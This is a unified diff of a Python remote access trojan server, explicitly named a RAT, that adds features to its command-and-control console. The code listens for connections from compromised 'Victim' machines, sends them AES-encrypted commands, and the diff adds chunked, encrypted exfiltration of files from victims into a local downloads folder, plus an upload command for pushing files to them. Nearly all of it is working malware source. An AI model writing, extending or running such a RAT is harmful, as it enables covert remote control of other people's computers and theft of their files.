@@ -1,4 +1,3 @@
-# rat_server.py
 import socket
 import threading
 import sys
@@ -8,17 +7,20 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import base64
-import os as crypto_os 
+import os as crypto_os
 
 # --- Configuration ---
 LISTEN_IP = "0.0.0.0"
 LISTEN_PORT = 9999
 BUFFER_SIZE = 4096
-def debug_print(message):
 
+def debug_print(message):
     print(f"[RAT] {message}")
-SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024" 
-SALT = b"ratsalt12345678" 
+
+SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"
+SALT = b"ratsalt12345678"
+DOWNLOAD_DIR = "downloads"
+os.makedirs(DOWNLOAD_DIR, exist_ok=True)
 
 clients = {}
 clients_lock = threading.Lock()
@@ -26,7 +28,6 @@ clients_lock = threading.Lock()
 backend = default_backend()
 
 def derive_key(password: bytes, salt: bytes) -> bytes:
-    """Derives a 32-byte AES key from a password and salt."""
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(),
         length=32,
@@ -34,8 +35,7 @@ def derive_key(password: bytes, salt: bytes) -> bytes:
         iterations=100000,
         backend=backend
     )
-    key = kdf.derive(password)
-    return key
+    return kdf.derive(password)
 
 try:
     AES_KEY = derive_key(SHARED_PASSWORD, SALT)
@@ -44,66 +44,72 @@ except Exception as e:
     print(f"[-] Error deriving encryption key: {e}")
     sys.exit(1)
 
-def encrypt_data(data: str) -> bytes:
-    """Encrypts data using AES-256-CBC and returns base64 encoded bytes."""
+def encrypt_data(data: bytes) -> bytes:
     if not AES_KEY:
-        return data.encode('utf-8')
-    
-    try:
-        if isinstance(data, str):
-            data = data.encode('utf-8')
-            
-        iv = crypto_os.urandom(16)
-        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
-        encryptor = cipher.encryptor()
-        pad_len = 16 - (len(data) % 16)
-        padded_data = data + bytes([pad_len] * pad_len)
-        
-        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-        return base64.b64encode(iv + ciphertext)
-    except Exception as e:
-        debug_print(f"Encryption error: {e}")
-        return data if isinstance(data, bytes) else data.encode('utf-8')
+        return data
 
-def decrypt_data(data: bytes) -> str:
-    """Decrypts base64 encoded data using AES-256-CBC."""
+    iv = crypto_os.urandom(16)
+    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
+    encryptor = cipher.encryptor()
+    pad_len = 16 - (len(data) % 16)
+    padded_data = data + bytes([pad_len] * pad_len)
+    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+    return base64.b64encode(iv + ciphertext)
+
+def decrypt_data(data: bytes) -> bytes:
     if not AES_KEY:
-        try:
-            return data.decode('utf-8')
-        except:
-            return str(data)
-    
+        return data
+
     try:
         if isinstance(data, str):
             data = data.encode('utf-8')
-            
+
         encrypted_data = base64.b64decode(data)
         if len(encrypted_data) < 16:
             raise ValueError("Data too short for IV")
-            
+
         iv = encrypted_data[:16]
         ciphertext = encrypted_data[16:]
-        
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
         decryptor = cipher.decryptor()
         padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
-        
         pad_len = padded_plaintext[-1]
         if pad_len > 16:
-            debug_print("Padding warning: invalid pad length, trying to strip last byte")
             pad_len = 1
-            
-        plaintext = padded_plaintext[:-pad_len]
-        return plaintext.decode('utf-8')
+        return padded_plaintext[:-pad_len]
     except Exception as e:
         debug_print(f"Decryption error: {e}")
-        try:
-            return data.decode('utf-8')
-        except:
-            return str(data)
+        return data
+
+def recv_exact(sock, n):
+    data = b""
+    while len(data) < n:
+        packet = sock.recv(n - len(data))
+        if not packet:
+            raise ConnectionError("Connection closed unexpectedly")
+        data += packet
+    return data
+
+def handle_file_transfer(sock, filename, filesize):
+    file_path = os.path.join(DOWNLOAD_DIR, filename)
+    bytes_received = 0
+    with open(file_path, "wb") as f:
+        while bytes_received < filesize:
+            # Lire la taille du chunk chiffré (4 bytes big-endian)
+            chunk_size_bytes = recv_exact(sock, 4)
+            chunk_size = int.from_bytes(chunk_size_bytes, 'big')
+
+            # Lire chunk chiffré
+            enc_chunk = recv_exact(sock, chunk_size)
+
+            # Déchiffrer chunk (bytes)
+            chunk = decrypt_data(enc_chunk)
+
+            f.write(chunk)
+            bytes_received += len(chunk)
+    print(f"[+] Fichier {filename} reçu avec succès.")
 
 def handle_client(client_socket, address):
-    """Handles communication with a single connected client (Victim)."""
     print(f"\n[+] Accepted connection from {address}")
     client_name = f"Client-{address[0]}:{address[1]}"
 
@@ -111,12 +117,33 @@ def handle_client(client_socket, address):
         clients[client_socket] = (address, client_name)
 
     try:
+        expecting_file = False
+        filename = None
+        filesize = 0
+
         while True:
-            data = client_socket.recv(BUFFER_SIZE)
-            if not data :
-                break
-            decrypted_response = decrypt_data(data)
-            print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
+            if not expecting_file:
+                data = client_socket.recv(BUFFER_SIZE)
+                if not data:
+                    break
+
+                decrypted_response = decrypt_data(data).decode('utf-8', errors='replace')
+
+                if decrypted_response.startswith("download_result "):
+                    try:
+                        _, filename, size_str = decrypted_response.strip().split(" ", 2)
+                        filesize = int(size_str)
+                        print(f"[+] Téléchargement du fichier {filename} ({filesize} octets)...")
+                        expecting_file = True
+                        handle_file_transfer(client_socket, filename, filesize)
+                        expecting_file = False
+                    except Exception as e:
+                        print(f"[-] Erreur pendant la réception de fichier : {e}")
+                else:
+                    print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
+            else:
+                # On ne devrait jamais arriver ici car handle_file_transfer bloque la réception complète
+                pass
 
     except ConnectionResetError:
         print(f"[-] Connection reset by {client_name} ({address})")
@@ -130,7 +157,6 @@ def handle_client(client_socket, address):
         print(f"[-] Connection with {client_name} ({address}) closed.")
 
 def send_commands():
-    """Thread function to read commands from the server operator and send them."""
     while True:
         try:
             with clients_lock:
@@ -149,7 +175,6 @@ def send_commands():
                 continue
 
             command_input = input("\nRAT Server> ").strip()
-
             if not command_input:
                 continue
 
@@ -166,13 +191,12 @@ def send_commands():
                             print("[!] Invalid client index.")
                 except (ValueError, IndexError):
                     print("[!] Usage: select <index>")
-
             elif command_input.lower() == "list":
                 pass
             elif command_input.lower() == "exit":
                 print("[+] Shutting down RAT Server...")
                 with clients_lock:
-                     sockets_to_close = list(clients.keys())
+                    sockets_to_close = list(clients.keys())
                 for sock in sockets_to_close:
                     try:
                         sock.close()
@@ -189,16 +213,34 @@ def send_commands():
             print(f"[!] Error in command input: {e}")
 
 def interact_with_client(client_socket, client_name, address):
-    """Sends commands to a specific client and waits for the response."""
     print(f"[+] Interacting with {client_name} ({address}). Type 'back' to return to main prompt.")
     try:
         while True:
-            cmd = input(f"RAT ({client_name})> ").rstrip('\n') 
+            cmd = input(f"RAT ({client_name})> ").rstrip('\n')
             if not cmd:
                 continue
             if cmd.lower() == 'back':
                 break
-            encrypted_cmd = encrypt_data(cmd + "\n") 
+
+            # Commande spéciale pour envoyer un fichier local au client
+            if cmd.lower().startswith("upload "):
+                filepath = cmd[7:].strip()
+                if not os.path.isfile(filepath):
+                    print("[!] File does not exist.")
+                    continue
+
+                filesize = os.path.getsize(filepath)
+                filename = os.path.basename(filepath)
+                # Envoie commande upload au client (à implémenter côté client)
+                cmd_msg = f"upload {filename} {filesize}"
+                client_socket.sendall(encrypt_data(cmd_msg.encode('utf-8')))
+                # TODO: gérer l'envoi du fichier côté client ici (pas dans ce code)
+
+                print(f"[!] Upload command sent for file '{filename}' ({filesize} bytes).")
+
+                continue
+
+            encrypted_cmd = encrypt_data(cmd.encode('utf-8'))
             if encrypted_cmd:
                 client_socket.sendall(encrypted_cmd)
                 print(f"[+] Encrypted command sent to {client_name}. Awaiting response...")
